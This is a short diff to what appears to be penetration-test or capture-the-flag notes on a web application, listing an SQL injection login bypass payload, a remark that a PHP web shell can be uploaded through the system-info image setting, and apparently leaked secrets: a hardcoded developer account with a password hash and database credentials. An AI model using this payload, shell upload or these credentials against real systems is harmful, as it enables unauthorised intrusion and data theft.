@@ -33,3 +33,13 @@ Sql injection in admin form
 ```
 admin' OR 1=1;#
 ```
+
+
+in system info we can change the image displayed to users and upload a php shell
+
+
+array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
+private $host = 'localhost';
+    private $username = 'cts';
+    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
+    private $database = 'cts_db';
